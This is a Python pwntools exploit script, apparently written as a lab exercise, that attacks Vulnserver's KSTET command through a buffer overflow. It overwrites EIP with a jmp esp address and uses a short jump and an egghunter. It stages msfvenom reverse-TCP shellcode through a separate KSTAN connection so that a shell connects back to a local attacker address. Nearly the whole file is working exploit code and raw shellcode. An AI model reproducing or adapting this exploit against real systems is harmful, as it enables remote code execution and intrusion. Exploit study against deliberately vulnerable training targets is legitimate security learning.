# EXPLORE THE SOCKET REUSE OPTION
from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "10.0.2.15"
port = 9999

cmd = "KSTET /.:/"
# cyclic -l 0x61616174
offset_eip = 76
eip = 0x625011af # Address of instruction we want to run (Ex. jmp esp).

# Here we put the shellcode we want to execute.
offset_sc = offset_eip + 4
shellcode = b"\xeb\xcc" # jmp -50

# Here we put our egghunter (TAG="Gsch").
offset_egg = offset_eip - 50
egg = (b"\x90"*8 + # less padding because stack was overwritting egghunter from below
b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a"
b"\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
b"\xff\xe7")

# Here we add our shellcode and prepend the tag so that egghunter finds it.
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f c -b "\x00\x0a"
tag_shellcode = (b"GschGsch"
b"\xdb\xc1\xbe\xd6\x22\xf1\x3c\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
b"\x52\x83\xed\xfc\x31\x75\x13\x03\xa3\x31\x13\xc9\xb7\xde\x51"
b"\x32\x47\x1f\x36\xba\xa2\x2e\x76\xd8\xa7\x01\x46\xaa\xe5\xad"
b"\x2d\xfe\x1d\x25\x43\xd7\x12\x8e\xee\x01\x1d\x0f\x42\x71\x3c"
b"\x93\x99\xa6\x9e\xaa\x51\xbb\xdf\xeb\x8c\x36\x8d\xa4\xdb\xe5"
b"\x21\xc0\x96\x35\xca\x9a\x37\x3e\x2f\x6a\x39\x6f\xfe\xe0\x60"
b"\xaf\x01\x24\x19\xe6\x19\x29\x24\xb0\x92\x99\xd2\x43\x72\xd0"
b"\x1b\xef\xbb\xdc\xe9\xf1\xfc\xdb\x11\x84\xf4\x1f\xaf\x9f\xc3"
b"\x62\x6b\x15\xd7\xc5\xf8\x8d\x33\xf7\x2d\x4b\xb0\xfb\x9a\x1f"
b"\x9e\x1f\x1c\xf3\x95\x24\x95\xf2\x79\xad\xed\xd0\x5d\xf5\xb6"
b"\x79\xc4\x53\x18\x85\x16\x3c\xc5\x23\x5d\xd1\x12\x5e\x3c\xbe"
b"\xd7\x53\xbe\x3e\x70\xe3\xcd\x0c\xdf\x5f\x59\x3d\xa8\x79\x9e"
b"\x42\x83\x3e\x30\xbd\x2c\x3f\x19\x7a\x78\x6f\x31\xab\x01\xe4"
b"\xc1\x54\xd4\xab\x91\xfa\x87\x0b\x41\xbb\x77\xe4\x8b\x34\xa7"
b"\x14\xb4\x9e\xc0\xbf\x4f\x49\xe5\x3f\x4d\x8f\x91\x3d\x51\x9e"
b"\x3d\xcb\xb7\xca\xad\x9d\x60\x63\x57\x84\xfa\x12\x98\x12\x87"
b"\x15\x12\x91\x78\xdb\xd3\xdc\x6a\x8c\x13\xab\xd0\x1b\x2b\x01"
b"\x7c\xc7\xbe\xce\x7c\x8e\xa2\x58\x2b\xc7\x15\x91\xb9\xf5\x0c"
b"\x0b\xdf\x07\xc8\x74\x5b\xdc\x29\x7a\x62\x91\x16\x58\x74\x6f"
b"\x96\xe4\x20\x3f\xc1\xb2\x9e\xf9\xbb\x74\x48\x50\x17\xdf\x1c"
b"\x25\x5b\xe0\x5a\x2a\xb6\x96\x82\x9b\x6f\xef\xbd\x14\xf8\xe7"
b"\xc6\x48\x98\x08\x1d\xc9\xb8\xea\xb7\x24\x51\xb3\x52\x85\x3c"
b"\x44\x89\xca\x38\xc7\x3b\xb3\xbe\xd7\x4e\xb6\xfb\x5f\xa3\xca"
b"\x94\x35\xc3\x79\x94\x1f")

# Create our payload.
payload = fit({
    0:cmd,
    offset_egg:egg,
    offset_eip:eip,
    offset_sc:shellcode,
    },length=200)

# Important to use different sockets because socket re-use truncated our shellcode
io1 = remote(ip,port)
io1.readline()
io1.sendline(b"KSTAN "+ tag_shellcode)
io1.close()

io = remote(ip,port)
io.readline()
io.sendline(payload)
